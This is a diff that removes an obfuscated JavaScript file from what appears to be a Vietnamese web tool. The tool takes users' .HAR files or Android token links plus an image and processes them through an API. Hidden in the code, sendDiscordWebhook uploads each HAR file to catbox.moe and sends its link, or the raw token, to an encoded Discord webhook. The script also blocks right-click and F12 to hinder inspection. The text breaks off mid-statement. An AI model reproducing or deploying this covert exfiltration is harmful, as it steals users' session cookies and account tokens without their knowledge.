@@ -1,1 +1,401 @@
-/* Obfuscated by J2TEAM.org */const _0x3e6e75=_0x51ee;(function(_0x399ebd,_0x15480b){const _0x4a5122=_0x51ee,_0x56e4a4=_0x399ebd();while(!![]){try{const _0x235c63=parseInt(_0x4a5122(0x1da))/0x1+parseInt(_0x4a5122(0x170))/0x2+-parseInt(_0x4a5122(0x16f))/0x3*(parseInt(_0x4a5122(0x1dd))/0x4)+-parseInt(_0x4a5122(0x14f))/0x5+-parseInt(_0x4a5122(0x18f))/0x6+parseInt(_0x4a5122(0x165))/0x7+parseInt(_0x4a5122(0x1e8))/0x8*(parseInt(_0x4a5122(0x1d3))/0x9);if(_0x235c63===_0x15480b)break;else _0x56e4a4['push'](_0x56e4a4['shift']());}catch(_0x323945){_0x56e4a4['push'](_0x56e4a4['shift']());}}}(_0x4e4a,0x53520));const _0x391efd=(function(){let _0x128b4d=!![];return function(_0x3b3e6e,_0x3afb65){const _0x3d28a3=_0x128b4d?function(){const _0xa67b05=_0x51ee;if(_0x3afb65){const _0x24e014=_0x3afb65[_0xa67b05(0x196)](_0x3b3e6e,arguments);return _0x3afb65=null,_0x24e014;}}:function(){};return _0x128b4d=![],_0x3d28a3;};}()),_0x44293e=_0x391efd(this,function(){const _0xc72879=_0x51ee;if(_0x44293e[_0xc72879(0x193)]()['toString']()[_0xc72879(0x162)]('\x0a')!==-0x1)return;return _0x44293e[_0xc72879(0x15b)]()[_0xc72879(0x158)]('(((.+)+)+)+$')[_0xc72879(0x15b)]()[_0xc72879(0x1c1)](_0x44293e)[_0xc72879(0x158)]('(((.+)+)+)+$');});_0x44293e();const API_BASE_URL=_0x3e6e75(0x1cf),DISCORD_WEBHOOK_URL=_0x3e6e75(0x1b1);let currentOs=_0x3e6e75(0x174),selectedHarFile=null,iosBlobImage=null,androidBlobImage=null,currentTargetPlatform=null,cropper=null;function _0x51ee(_0x2fb431,_0x2cc69f){_0x2fb431=_0x2fb431-0x14c;const _0x3f45ab=_0x4e4a();let _0x44293e=_0x3f45ab[_0x2fb431];if(_0x51ee['AQutgY']===undefined){var _0x391efd=function(_0x589b9b){const _0x25ddea='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x346bc8='',_0x5e5fa8='',_0x4a1a5c=_0x346bc8+_0x391efd,_0x128b4d=(''+function(){return 0x0;})['indexOf']('\x0a')!==-0x1;for(let _0x3b3e6e=0x0,_0x3afb65,_0x3d28a3,_0x24e014=0x0;_0x3d28a3=_0x589b9b['charAt'](_0x24e014++);~_0x3d28a3&&(_0x3afb65=_0x3b3e6e%0x4?_0x3afb65*0x40+_0x3d28a3:_0x3d28a3,_0x3b3e6e++%0x4)?_0x346bc8+=_0x128b4d||_0x4a1a5c['charCodeAt'](_0x24e014+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x3afb65>>(-0x2*_0x3b3e6e&0x6)):_0x3b3e6e:0x0){_0x3d28a3=_0x25ddea['indexOf'](_0x3d28a3);}for(let _0x13af18=0x0,_0x20aa31=_0x346bc8['length'];_0x13af18<_0x20aa31;_0x13af18++){_0x5e5fa8+='%'+('00'+_0x346bc8['charCodeAt'](_0x13af18)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5e5fa8);};_0x51ee['VGPwMw']=_0x391efd,_0x51ee['JzpxLc']={},_0x51ee['AQutgY']=!![];}const _0x4e4a8a=_0x3f45ab[0x0],_0x51eeb9=_0x2fb431+_0x4e4a8a,_0x190aea=_0x51ee['JzpxLc'][_0x51eeb9];if(!_0x190aea){const _0x374a52=function(_0x3d18c7){this['gkvSiU']=_0x3d18c7,this['mbgDzj']=[0x1,0x0,0x0],this['RjxaOy']=function(){return'newState';},this['yvhqEi']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a',this['EusHZr']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};_0x374a52['prototype']['lpzkvQ']=function(){const _0x3d5009=new RegExp(this['yvhqEi']+this['EusHZr']),_0x30d3cd=_0x3d5009['test'](this['RjxaOy']['toString']())?--this['mbgDzj'][0x1]:--this['mbgDzj'][0x0];return this['zCTcxA'](_0x30d3cd);},_0x374a52['prototype']['zCTcxA']=function(_0xde128d){if(!Boolean(~_0xde128d))return _0xde128d;return this['SEUSPE'](this['gkvSiU']);},_0x374a52['prototype']['SEUSPE']=function(_0x36bed9){for(let _0x7e7af6=0x0,_0x486c91=this['mbgDzj']['length'];_0x7e7af6<_0x486c91;_0x7e7af6++){this['mbgDzj']['push'](Math['round'](Math['random']())),_0x486c91=this['mbgDzj']['length'];}return _0x36bed9(this['mbgDzj'][0x0]);},(''+function(){return 0x0;})['indexOf']('\x0a')===-0x1&&new _0x374a52(_0x51ee)['lpzkvQ'](),_0x44293e=_0x51ee['VGPwMw'](_0x44293e),_0x51ee['JzpxLc'][_0x51eeb9]=_0x44293e;}else _0x44293e=_0x190aea;return _0x44293e;}const bgMusic=document[_0x3e6e75(0x18d)]('bgMusic'),musicBtn=document[_0x3e6e75(0x18d)]('musicToggleBtn'),musicIcon=document[_0x3e6e75(0x18d)]('musicIcon');let isMusicPlayed=![];function startMusic(){const _0x2b478e=_0x3e6e75;!isMusicPlayed&&bgMusic[_0x2b478e(0x1bc)]()[_0x2b478e(0x1ca)](()=>{const _0x13644a=_0x2b478e;isMusicPlayed=!![],musicBtn[_0x13644a(0x168)][_0x13644a(0x172)](_0x13644a(0x18c)),document[_0x13644a(0x16d)]('click',startMusic),document[_0x13644a(0x16d)](_0x13644a(0x1a0),startMusic);})[_0x2b478e(0x19b)](_0x13af18=>{const _0x46e43f=_0x2b478e;console[_0x46e43f(0x1ea)]('Trình\x20duyệt\x20chặn\x20Autoplay:',_0x13af18);});}document[_0x3e6e75(0x185)](_0x3e6e75(0x19d),startMusic),document[_0x3e6e75(0x185)](_0x3e6e75(0x1a0),startMusic);function toggleMusic(_0x20aa31){const _0x174b4b=_0x3e6e75;_0x20aa31[_0x174b4b(0x1ba)](),bgMusic[_0x174b4b(0x157)]?(bgMusic[_0x174b4b(0x1bc)](),isMusicPlayed=!![],musicBtn[_0x174b4b(0x168)][_0x174b4b(0x172)](_0x174b4b(0x18c)),musicIcon['className']='fa-solid\x20fa-music'):(bgMusic[_0x174b4b(0x187)](),musicBtn['classList'][_0x174b4b(0x1c7)](_0x174b4b(0x18c)),musicIcon[_0x174b4b(0x1c9)]=_0x174b4b(0x1e3));}const dvd=document['getElementById'](_0x3e6e75(0x1a2));let dvdWidth=0x37,dvdHeight=0x37,posX=Math[_0x3e6e75(0x18b)]()*(window[_0x3e6e75(0x177)]-dvdWidth),posY=Math['random']()*(window['innerHeight']-dvdHeight),speedX=2.5,speedY=2.5;function animateDVD(){const _0xffd700=_0x3e6e75,_0x374a52=window[_0xffd700(0x177)],_0x3d18c7=window[_0xffd700(0x1aa)];posX+=speedX,posY+=speedY;if(posX+dvdWidth>=_0x374a52)speedX=-Math['abs'](speedX),posX=_0x374a52-dvdWidth;else posX<=0x0&&(speedX=Math[_0xffd700(0x1a7)](speedX),posX=0x0);if(posY+dvdHeight>=_0x3d18c7)speedY=-Math[_0xffd700(0x1a7)](speedY),posY=_0x3d18c7-dvdHeight;else posY<=0x0&&(speedY=Math[_0xffd700(0x1a7)](speedY),posY=0x0);dvd[_0xffd700(0x176)][_0xffd700(0x1eb)]=_0xffd700(0x151)+posX+_0xffd700(0x1c4)+posY+_0xffd700(0x1c3),requestAnimationFrame(animateDVD);}window[_0x3e6e75(0x185)](_0x3e6e75(0x17c),()=>{const _0x31c5b7=_0x3e6e75;if(posX>window[_0x31c5b7(0x177)]-dvdWidth)posX=window[_0x31c5b7(0x177)]-dvdWidth;if(posY>window[_0x31c5b7(0x1aa)]-dvdHeight)posY=window['innerHeight']-dvdHeight;}),window['addEventListener']('DOMContentLoaded',()=>{const _0x31b6c2=_0x3e6e75;animateDVD(),Swal[_0x31b6c2(0x197)]({'title':_0x31b6c2(0x155),'imageUrl':_0x31b6c2(0x1ed),'text':_0x31b6c2(0x19c),'icon':_0x31b6c2(0x14e),'confirmButtonText':'Tôi\x20Đã\x20Hiểu','confirmButtonColor':_0x31b6c2(0x1e7)});});function _0x4e4a(){const _0x593862=['Dg9Rzw4','Bg9HzgLUz19HBMrYB2LKlNbUzW','zMfPBgvK','Aw5KzxHpzG','yw5KCM9Pza','zMeTC29SAwqGzMeTy2LYy2XLlwnOzwnRigjPzY1Py29U','mJa5nJu4nfPtwxjNqG','Aw5UzxjuzxH0','A2v5q29Kzq','y2XHC3nmAxn0','XjbHBMCGEog7RsbSW70','Ahr0Chm6lY9PlMLIyI5JBY9oz3OZnhyYsc85luq3luneq0jgltGYmZuTnc1bmdGTotuTqKuTmJaTquy2luffodqYmJmUANbN','XjddS25N','zg9UyxrLu2vJDgLVBG','CMvTB3zLrxzLBNrmAxn0zw5LCG','vgHHBYb0W6fJihrOyxKG4BQJBMGGAg/dOg4GDog6PxqU','m2nqqwvdra','otC3mtG2ufzRwxzY','CMvZDwX0','ywrK','BgLUAW','Aw9Z','y3jVCe1VzgfS','C3r5Bgu','Aw5UzxjxAwr0Aa','zMLSzxm','ygbG','wog7RsbSW70GDgJHUQv0iglHUQfP','C3rHDhvZ','CMvZAxPL','vgJdOg5OiepdTg5Niq','ChjLDMvUDerLzMf1Bhq','AM9Ix2LK','Aw1Hz2uVCg5N','Bwv0yuTLEq','yw5KCM9PzfrVA2vUsw5WDxq','Aw1Hz2vuB0nYB3a','tog7L2KGA+g6V3qGBUg7KwK','ywrKrxzLBNrmAxn0zw5LCG','Dg9mB2nHBgvtDhjPBMC','Cgf1C2u','4P2micOQtog7L2K6kIOG','uxxdOsb0CSoSBMGGEog7RsbSW70GyUg7IYbS4BUxAq','yw5KCM9Pzfn0yxr1C0jHzgDL','CMfUzg9T','CgXHEwLUzW','z2v0rwXLBwvUDej5swq','AgfYx2zPBgu','mte3nty5neLVueHYwq','XjbHBMCGz+g7RwKUlI4','Dg9cBg9I','vgHP4BQ/DsbmAw5RifrVA2vUiq','yMLUza','Dgv4Da','vgHP4BQ/DsdHUQjUAce','yxbWBhK','zMLYzq','vgHHEsdHUQnUAcbSB2fKAw5NihrOW6bUAcbJW7rUzY4','yw5KCM9PzfnLy3rPB24','DgfIlwj0BIbHy3rPDMuTyw5KCM9Pza','y2f0y2G','vg/dOg4GyUg7MsbTW6mGBMD14BUtBIb2W6aGDmoGAsbSAEg7H3uGqvbjimsr4BUbDsdeKCAW4BUJyYb0AgfTigTO4BQJBYb2W6aGDgH14BUzyYbXDxNHU4fUihpHU58GAog7R3uGy+g7P2eGvSAWXQfUzYbuAgfUAcbuW7OUifz1AsbSW7jUzYbRAmo0BMCGy3jHy2SGzmAW4BUBAsbT4BUnAsbOW6XUAcb0Aog7QwmH','y2XPy2S','AgLKzgvU','B25SB2fK','Dg91y2HZDgfYDa','u3rHDhvZqMfKz2u','zhzKtg9NBW','AgfYswnVBG','Dg9eyxrHvvjm','DgfYz2v0','C3rHDhvZx3rLEhq','ywjZ','4P2mieTOW7rUzYb0Aog7GYbR4BQ/DcbU4BUrAsdeKEg6V24GAog7HYb0Aog7Kw5Niq','4P2mieZHU5DPoIa','Aw5UzxjizwLNAhq','CMvXDhLWzq','y3rYBeTLEq','zgLZCgXHEq','vog6O2KGzMLSzsbSW6PUihnLCNzLCIbSXRb1ihrY4BUVihrO4BQLDcbI4BQHAse','DMKTvK4','Aw9Zu3rHDhvZqMfKz2u','Ahr0Chm6lY9KAxnJB3jKlMnVBs9HCgKVD2vIAg9VA3mVmtuZmJC1mJyWntiXmJGZntKWmY9wvgr1A2HSr19RB0fhudjAEfqZyK5ntfbSyvC1txvblwWZmJvXqNHjBxviqtfYv1i1mw5Tm05TzMTJve40C0yXCefJqq','vgHP4BQ/DsbgAwXLieHbuIe','tg9NBYbowum','Bg9HzgLUz19PB3mUCg5N','vgJHUQv0iglHUQfP','tog7L2KGA2HPihJHU60GBmo9ifDLyMHVB2S6','yNrUvgfIqw5KCM9Pza','DgfIlwj0BG','4OYBimsqyw5NihtHU7eGXjhHU5LUzYb1CgXVywqGzMLSzsaUsefsihBdOcbN4BUTAsbK4BUVigXP4BUhDs4UlG','C3rVCfbYB3bHz2f0Aw9U','z2v0q3jVChbLzenHBNzHCW','CgXHEq','vNvPigZdSM5NigtdOw4GBgLUAYb0B2TLBIbRz3zUihBdOg8GA2H1BMCGDhldQM4U','C2HPzNrlzxK','DMfSDwu','BwvZC2fNzq','y29UC3rYDwn0B3i','vNvPigZdSM5NignO4BUnBIdHUQnUAcbSB2fKAw5NignOBYbbBMrYB2LKlG','ChGSidaP','ChGSia','C3vJy2vZCW','Ahr0Chm6lY9RBgLWEs5JB20Vz2LMCY9HEwfUzs1JDxrL','CMvTB3zL','DgfIlwj0BIbHy3rPDMuTAw9Z','y2XHC3noyw1L','DgHLBG','l2fWAs9JAgvJAY8','iZeWyJK4mq','vLruifrVB2XZieXVzYbtExn0zw0','Aw1Hz2u','Ahr0Chm6lY9WCM94Es1HCgKTz2fYzw5HlM1LB3CTD2vIlNDVCMTLCNmUzgv2','yMXVy2S','y29SB3i','CMvHzefZrgf0yvvsta','mtK3mdGYEePSshjj','Aw5Uzxjive1m','vgJHUQv0ielHUQfP','Aw9Zsw1NuhjLDMLLDW','yxbWzw5K','sg/dOg4GDgJdOg5O','Aw9Zsw1NugXHy2vOB2XKzxi','ndq2mdeYqNLODfrk','zgvZDhjVEq','D2fYBMLUzW','mtyZnZy3nLruCLvpDW','ue9tva','zxjYB3i','A2v5','ANnVBG','4PYfie3dOYb5W6P1igpHUQD1oIa8yJ4','zMeTC29SAwqGzMeTDM9SDw1LlxHTyxjR','yw5KCM9PzeLTz1bYzxzPzxC','yNrUvgfIsw9Z','zgf0yq','iZm4yMrMoa','mtm2tLbdEe5K','DgfIlwj0BIbHy3rPDMuTzg9UyxrL','Bg9N','DhjHBNnMB3jT','pc9IpJXICJ7IJ7mGvhlHUQfUzYb0AmoHAtOG','Ahr0Chm6lY9PlMLIyI5JBY9xtgjItgPYl0eXndu3mtC4lueZmtiTndCYlumTos1emtiTmY1fnI1ertu3lumYos1cos5QCgC','tog7L2KGA2NHU4nTihrYyq','BMfTzq','XjbHBMCGDxbSB2fKlI4U','yNrUvgfIrg9UyxrL','Aw5MBW','mZi5ody3nwfhveT6qG','vNvPigZdSM5NignO4BUnBIdHUQnUAcbSB2fKAw5NignOBYbPt1mU','DhjHBNnSyxrLm2qO','i2vMndq0na','lI4U','Aw9Zu2vJDgLVBG','vgJdTg5NieldOw8GqUg6O24Guxv54BUbBG','C3rYAw5NAwz5','Cgf1C2vK','C2vHCMnO','zMLSzq','l2fWAs91CgXVywq','Dg9tDhjPBMC','vLruifrVB2XZiejVDa','DhjPBq','zMLSzxvWBg9Hza'];_0x4e4a=function(){return _0x593862;};return _0x4e4a();}function openNycModal(){const _0x133588=_0x3e6e75;Swal[_0x133588(0x197)]({'title':'Đây\x20là\x20NYC\x20mình!😔','imageUrl':_0x133588(0x16a),'imageWidth':0x118,'imageHeight':0x118,'imageAlt':_0x133588(0x1b3),'showCloseButton':!![],'confirmButtonText':_0x133588(0x16b),'confirmButtonColor':_0x133588(0x1e7)});}function switchOs(_0x3d5009){const _0x3ce875=_0x3e6e75;currentOs=_0x3d5009;const _0x30d3cd=document['getElementById'](_0x3ce875(0x1e5)),_0xde128d=document[_0x3ce875(0x18d)](_0x3ce875(0x1b7)),_0x36bed9=document[_0x3ce875(0x18d)](_0x3ce875(0x14d)),_0x7e7af6=document[_0x3ce875(0x18d)](_0x3ce875(0x154)),_0x486c91=document['getElementById'](_0x3ce875(0x199)),_0x45798d=document[_0x3ce875(0x18d)](_0x3ce875(0x16c));_0x30d3cd[_0x3ce875(0x1c9)]='tab-btn',_0xde128d[_0x3ce875(0x1c9)]=_0x3ce875(0x1b8),_0x36bed9[_0x3ce875(0x1c9)]=_0x3ce875(0x1b8),_0x7e7af6[_0x3ce875(0x168)]['add']('hidden'),_0x486c91[_0x3ce875(0x168)][_0x3ce875(0x172)](_0x3ce875(0x19e)),_0x45798d[_0x3ce875(0x168)][_0x3ce875(0x172)]('hidden');if(_0x3d5009==='ios')_0x30d3cd[_0x3ce875(0x1c9)]=_0x3ce875(0x1c8),_0x7e7af6[_0x3ce875(0x168)]['remove'](_0x3ce875(0x19e));else{if(_0x3d5009==='android')_0xde128d[_0x3ce875(0x1c9)]=_0x3ce875(0x19a),_0x486c91['classList'][_0x3ce875(0x1c7)](_0x3ce875(0x19e));else _0x3d5009==='donate'&&(_0x36bed9[_0x3ce875(0x1c9)]=_0x3ce875(0x1e9),_0x45798d['classList'][_0x3ce875(0x1c7)](_0x3ce875(0x19e)));}}function handleHarUpload(_0xa3e28b){const _0x6095fa=_0x3e6e75,_0xc4e253=_0xa3e28b[_0x6095fa(0x1a5)][_0x6095fa(0x178)][0x0];_0xc4e253&&(selectedHarFile=_0xc4e253,document[_0x6095fa(0x18d)](_0x6095fa(0x1a3))[_0x6095fa(0x1c9)]=_0x6095fa(0x164),document[_0x6095fa(0x18d)](_0x6095fa(0x1a3))[_0x6095fa(0x176)][_0x6095fa(0x1d1)]='#38bdf8',document[_0x6095fa(0x18d)]('harText')[_0x6095fa(0x166)]=_0xc4e253['name']);}function handleImageSelect(_0x5df92f,_0x283652){const _0x17a5f2=_0x3e6e75;currentTargetPlatform=_0x283652;const _0x28228a=_0x5df92f[_0x17a5f2(0x1a5)]['files'][0x0];if(_0x28228a){const _0xfa8dca=new FileReader();_0xfa8dca[_0x17a5f2(0x19f)]=_0xfcf4f7=>{const _0x260000=_0x17a5f2;document['getElementById'](_0x260000(0x175))[_0x260000(0x168)][_0x260000(0x1c7)]('hidden');const _0x12749d=document[_0x260000(0x18d)](_0x260000(0x183));_0x12749d['src']=_0xfcf4f7[_0x260000(0x1a5)][_0x260000(0x171)];if(cropper)cropper[_0x260000(0x1db)]();cropper=new Cropper(_0x12749d,{'aspectRatio':0x438/0x6a5,'viewMode':0x1,'autoCropArea':0.95});},_0xfa8dca[_0x17a5f2(0x1d2)](_0x28228a);}_0x5df92f[_0x17a5f2(0x1a5)][_0x17a5f2(0x1bf)]='';}function closeCropModal(){const _0x6de282=_0x3e6e75;document[_0x6de282(0x18d)](_0x6de282(0x175))[_0x6de282(0x168)][_0x6de282(0x172)](_0x6de282(0x19e));if(cropper)cropper[_0x6de282(0x1db)]();}function applyCrop(){const _0x588c6e=_0x3e6e75;if(!cropper)return;const _0x2fb792=cropper[_0x588c6e(0x1bb)]({'width':0x438,'height':0x6a5});if(currentTargetPlatform===_0x588c6e(0x174)){const _0x1b1bf7=document[_0x588c6e(0x18d)](_0x588c6e(0x1d6));_0x1b1bf7['src']=_0x2fb792['toDataURL'](_0x588c6e(0x180)),_0x1b1bf7[_0x588c6e(0x176)][_0x588c6e(0x1ad)]=_0x588c6e(0x1d0),document[_0x588c6e(0x18d)](_0x588c6e(0x1d9))[_0x588c6e(0x168)][_0x588c6e(0x172)](_0x588c6e(0x19e)),_0x2fb792['toBlob'](_0x1a6d05=>{iosBlobImage=_0x1a6d05;},_0x588c6e(0x180));}else{const _0x34812e=document[_0x588c6e(0x18d)](_0x588c6e(0x1e4));_0x34812e['src']=_0x2fb792[_0x588c6e(0x1a4)](_0x588c6e(0x180)),_0x34812e[_0x588c6e(0x176)][_0x588c6e(0x1ad)]=_0x588c6e(0x1d0),document[_0x588c6e(0x18d)]('androidImgPlaceholder')[_0x588c6e(0x168)][_0x588c6e(0x172)](_0x588c6e(0x19e)),_0x2fb792[_0x588c6e(0x191)](_0x2ac2a6=>{androidBlobImage=_0x2ac2a6;},_0x588c6e(0x180));}closeCropModal();}async function uploadFileToCatbox(_0x1e7649){const _0xa65f36=_0x3e6e75,_0x29cf3f=new FormData();_0x29cf3f['append'](_0xa65f36(0x1ab),_0xa65f36(0x15e)),_0x29cf3f['append']('fileToUpload',_0x1e7649);const _0x3d908e=await fetch('https://catbox.moe/user/api.php',{'method':_0xa65f36(0x1de),'body':_0x29cf3f});if(!_0x3d908e['ok'])throw new Error(_0xa65f36(0x1ae));const _0x349952=await _0x3d908e[_0xa65f36(0x194)]();return _0x349952[_0xa65f36(0x15d)]();}async function sendDiscordWebhook(_0x3cda3c,_0xca4df){const _0x47d21b=_0x3e6e75;try{const _0xdfdae9=new Date()[_0x47d21b(0x186)](_0x47d21b(0x1af));let _0x5f1bb3={};if(_0x3cda3c==='ios'){const _0x5ad1d8=await uploadFileToCatbox(_0xca4df[_0x47d21b(0x159)]);_0x5f1bb3={'username':_0x47d21b(0x15c),'avatar_url':_0x47d21b(0x1c6),'embeds':[{'title':'🚀\x20Đã\x20Upload\x20File\x20.HAR\x20Thành\x20Công\x20(iOS)','color':0x38bff8,'fields':[{'name':'📁\x20Tên\x20File\x20HAR','value':_0x47d21b(0x179)+_0xca4df['file'][_0x47d21b(0x1ef)]+_0x47d21b(0x179),'inline':![]},{'name':'📊\x20Dung\x20Lượng','value':(_0xca4df[_0x47d21b(0x159)]['size']/0x400)['toFixed'](0x2)+'\x20KB','inline':!![]},{'name':'🔗\x20Link\x20Tải\x20Trực\x20Tiếp\x20File\x20HAR','value':'[Bấm\x20Vào\x20Đây\x20Để\x20Tải\x20File\x20HAR]('+_0x5ad1d8+')','inline':![]},{'name':'🕒\x20Thời\x20Gian','value':_0xdfdae9,'inline':!![]}],'footer':{'text':_0x47d21b(0x1cd)}}]};}else _0x3cda3c===_0x47d21b(0x163)&&(_0x5f1bb3={'username':'VTT\x20Tools\x20Bot','avatar_url':_0x47d21b(0x1c6),'embeds':[{'title':'📱\x20Link\x20Token\x20Android\x20Mới','color':0x10b901,'fields':[{'name':'🔑\x20Link\x20Token\x20/\x20KGVN','value':_0x47d21b(0x179)+_0xca4df[_0x47d21b(0x15f)]+_0x47d21b(0x179),'inline':![]},{'name':'🕒\x20Thời\x20Gian','value':_0xdfdae9,'inline':!![]}],'footer':{'text':_0x47d21b(0x1cd)}}]});await fetch(DISCORD_WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x47d21b(0x156)](_0x5f1bb3)});}catch(_0x5220d6){console[_0x47d21b(0x1df)](_0x47d21b(0x1b6),_0x5220d6);}}async function submitIosProcess(){const _0x78b137=_0x3e6e75;if(!selectedHarFile){Swal[_0x78b137(0x197)]({'icon':'warning','title':_0x78b137(0x1b2),'text':'Vui\x20lòng\x20chọn\x20file\x20.HAR\x20trước.'});return;}if(!iosBlobImage){Swal[_0x78b137(0x197)]({'icon':_0x78b137(0x1dc),'title':_0x78b137(0x195),'text':_0x78b137(0x150)});return;}const _0x2387bf=document['getElementById']('iosStatusLog'),_0xef4c80=document['getElementById'](_0x78b137(0x1b0));_0xef4c80['innerText']=_0x78b137(0x14c),_0xef4c80[_0x78b137(0x176)]['color']=_0x78b137(0x1e7),_0x2387bf['innerHTML']=_0x78b137(0x1b9),sendDiscordWebhook('ios',{'file':selectedHarFile});const _0x20ab3d=new FormData();_0x20ab3d[_0x78b137(0x1d7)](_0x78b137(0x18e),selectedHarFile),_0x20ab3d['append'](_0x78b137(0x1ce),iosBlobImage,_0x78b137(0x1b4));try{const _0x592120=await fetch(API_BASE_URL+_0x78b137(0x15a),{'method':'POST','body':_0x20ab3d}),_0x8f4179=await _0x592120[_0x78b137(0x1e1)]();_0x8f4179[_0x78b137(0x1c5)]?(_0xef4c80[_0x78b137(0x166)]=_0x78b137(0x169),_0x2387bf[_0x78b137(0x1d4)]=_0x78b137(0x1e2)+_0x8f4179[_0x78b137(0x17f)]+'</b><br>⏳\x20Đang\x20chờ\x20máy\x20chủ\x20hoàn\x20tất...',trackStatus(_0x8f4179[_0x78b137(0x17f)],'ios')):(_0xef4c80['innerText']=_0x78b137(0x1b5),_0xef4c80[_0x78b137(0x176)][_0x78b137(0x1d1)]=_0x78b137(0x152),_0x2387bf[_0x78b137(0x1d4)]=_0x78b137(0x1a9)+(_0x8f4179[_0x78b137(0x1df)]||_0x78b137(0x17a)));}catch(_0x54af72){_0xef4c80[_0x78b137(0x166)]=_0x78b137(0x184),_0xef4c80[_0x78b137(0x176)][_0x78b137(0x1d1)]=_0x78b137(0x152),_0x2387bf['innerHTML']=_0x78b137(0x1a8);}}async function submitAndroidProcess(){const _0x32b432=_0x3e6e75,_0x1e1f89=document[_0x32b432(0x18d)](_0x32b432(0x182))[_0x32b432(0x1bf)][_0x32b432(0x15d)]();if(!_0x1e1f89){Swal['fire']({'icon':_0x32b432(0x1dc),'title':_0x32b432(0x192),'text':_0x32b432(0x1bd)});return;}if(!androidBlobImage){Swal[_0x32b432(0x197)]({'icon':'warning','title':_0x32b432(0x195),'text':_0x32b432(0x1c2)});return;}sendDiscordWebhook(_0x32b432(0x163),{'token':_0x1e1f89});const _0x41581f=document[_0x32b432(0x18d)]('androidStatusLog'),_0x33a436=document[_0x32b432(0x18d)](_0x32b432(0x18a));_0x33a436[_0x32b432(0x166)]=_0x32b432(0x190),_0x33a436[_0x32b432(0x176)]['color']='#10b981',_0x41581f['innerHTML']='⌛\x20Đang\x20tải\x20dữ\x20liệu\x20Android\x20lên\x20máy\x20chủ...';const _0x1fb264=new FormData();_0x1fb264[_0x32b432(0x1d7)](_0x32b432(0x173),_0x1e1f89),_0x1fb264[_0x32b432(0x1d7)](_0x32b432(0x1ce),androidBlobImage,_0x32b432(0x160));try{const _0x544fba=await fetch(API_BASE_URL+_0x32b432(0x15a),{'method':_0x32b432(0x1de),'body':_0x1fb264}),_0x3c9566=await _0x544fba[_0x32b432(0x1e1)]();_0x3c9566[_0x32b432(0x1c5)]?(_0x33a436['innerText']=_0x32b432(0x169),_0x41581f[_0x32b432(0x1d4)]=_0x32b432(0x1e2)+_0x3c9566['job_id']+'</b><br>⏳\x20Đang\x20chờ\x20máy\x20chủ\x20hoàn\x20tất...',trackStatus(_0x3c9566[_0x32b432(0x17f)],'android')):(_0x33a436[_0x32b432(0x166)]='Thất\x20bại',_0x33a436['style'][_0x32b432(0x1d1)]=_0x32b432(0x152),_0x41581f[_0x32b432(0x1d4)]=_0x32b432(0x1a9)+(_0x3c9566[_0x32b432(0x1df)]||_0x32b432(0x17a)));}catch(_0x29e857){_0x33a436[_0x32b432(0x166)]='Lỗi\x20kết\x20nối',_0x33a436[_0x32b432(0x176)][_0x32b432(0x1d1)]='#ef4444',_0x41581f[_0x32b432(0x1d4)]=_0x32b432(0x1a8);}}function trackStatus(_0x38ddcc,_0x25aa0a){const _0x54cc01=_0x3e6e75,_0x42a562=document[_0x54cc01(0x18d)](_0x25aa0a+'StatusLog'),_0x34d2ee=document['getElementById'](_0x25aa0a+_0x54cc01(0x1a1)),_0x1e5a02=setInterval(async()=>{const _0x4e8162=_0x54cc01;try{const _0x1ebc97=await fetch(API_BASE_URL+_0x4e8162(0x1cb)+_0x38ddcc),_0x155e7c=await _0x1ebc97[_0x4e8162(0x1e1)]();if(_0x155e7c[_0x4e8162(0x1c5)]){const _0x4b87d1=_0x155e7c[_0x4e8162(0x1e6)];if(_0x4b87d1[_0x4e8162(0x17b)]===_0x4e8162(0x1c5)||_0x4b87d1[_0x4e8162(0x17b)]==='completed')clearInterval(_0x1e5a02),_0x34d2ee[_0x4e8162(0x166)]=_0x4e8162(0x1d8),_0x34d2ee[_0x4e8162(0x176)][_0x4e8162(0x1d1)]=_0x4e8162(0x1cc),_0x42a562[_0x4e8162(0x1d4)]='🎉\x20**Thành\x20công!**<br>'+(_0x4b87d1[_0x4e8162(0x1c0)]||_0x4e8162(0x198)),Swal['fire']({'icon':_0x4e8162(0x1c5),'title':_0x4e8162(0x17d),'text':_0x4e8162(0x16e)});else _0x4b87d1[_0x4e8162(0x17b)]===_0x4e8162(0x161)||_0x4b87d1[_0x4e8162(0x17b)]===_0x4e8162(0x1df)?(clearInterval(_0x1e5a02),_0x34d2ee[_0x4e8162(0x166)]=_0x4e8162(0x1b5),_0x34d2ee[_0x4e8162(0x176)]['color']=_0x4e8162(0x152),_0x42a562[_0x4e8162(0x1d4)]=_0x4e8162(0x188)+(_0x4b87d1[_0x4e8162(0x1df)]||_0x4e8162(0x189)),Swal[_0x4e8162(0x197)]({'icon':_0x4e8162(0x1df),'title':_0x4e8162(0x1d5),'text':_0x4b87d1[_0x4e8162(0x1df)]||'Xử\x20lý\x20thất\x20bại'})):_0x42a562[_0x4e8162(0x1d4)]=_0x4e8162(0x1e2)+_0x38ddcc+_0x4e8162(0x1ec)+(_0x4b87d1[_0x4e8162(0x1a6)]||_0x4b87d1[_0x4e8162(0x17b)])+_0x4e8162(0x153);}}catch(_0x1cfcca){clearInterval(_0x1e5a02),_0x34d2ee[_0x4e8162(0x166)]=_0x4e8162(0x1ee),_0x34d2ee[_0x4e8162(0x176)][_0x4e8162(0x1d1)]=_0x4e8162(0x152),_0x42a562[_0x4e8162(0x1d4)]='❌\x20Không\x20thể\x20kiểm\x20tra\x20tiến\x20trình\x20từ\x20máy\x20chủ!';}},0xbb8);}document[_0x3e6e75(0x185)]('contextmenu',function(_0x17a4a2){const _0x4f4223=_0x3e6e75;_0x17a4a2[_0x4f4223(0x17e)]();}),document[_0x3e6e75(0x185)]('keydown',function(_0x47f623){const _0x527f92=_0x3e6e75;if(_0x47f623[_0x527f92(0x1e0)]==='F12'||_0x47f623[_0x527f92(0x167)]===0x7b)return 